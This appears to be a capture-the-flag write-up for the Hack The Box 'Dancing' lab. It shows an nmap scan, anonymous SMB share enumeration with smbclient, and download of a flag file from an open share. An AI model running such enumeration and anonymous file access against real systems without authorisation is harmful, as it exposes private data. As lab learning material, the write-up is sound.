---
layout: default
title: Dancing
parent: HTB - Very Easy
nav_order: 2
published: false
---
![Dancing](images/Dancing.png)
<button type="button" name="button" class="btn">#smb</button>

Simple SMB Connection (anonymous)

# NMAP Scan
```
┌──(ghohst㉿kali)-[~]
└─$ nmap -sC -sV 10.129.132.70 > dancing.txt
                                                                                                              
┌──(ghohst㉿kali)-[~]
└─$ cat dancing.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 17:46 MST
Nmap scan report for 10.129.132.70
Host is up (0.085s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h00m03s
| smb2-time: 
|   date: 2022-02-07T04:46:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.70 seconds
```

# SMB Connection
```
┌──(ghohst㉿kali)-[~]
└─$ smbclient -L \10.129.132.70
Enter WORKGROUP\ghohst's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.132.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```        

Disconnected from root \ and reconnected to 'WorkShares' and downloaded 'via get' to retrieve the flag:
```    
┌──(ghohst㉿kali)-[~]
└─$ smbclient \\\\10.129.132.70\\WorkShares
Enter WORKGROUP\ghohst's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 29 02:22:01 2021
  ..                                  D        0  Mon Mar 29 02:22:01 2021
  Amy.J                               D        0  Mon Mar 29 03:08:24 2021
  James.P                             D        0  Thu Jun  3 02:38:03 2021

                5114111 blocks of size 4096. 1732549 blocks available
smb: \> cd James.P
smb: \James.P\> dir
  .                                   D        0  Thu Jun  3 02:38:03 2021
  ..                                  D        0  Thu Jun  3 02:38:03 2021
  flag.txt                            A       32  Mon Mar 29 03:26:57 2021

                5114111 blocks of size 4096. 1732549 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```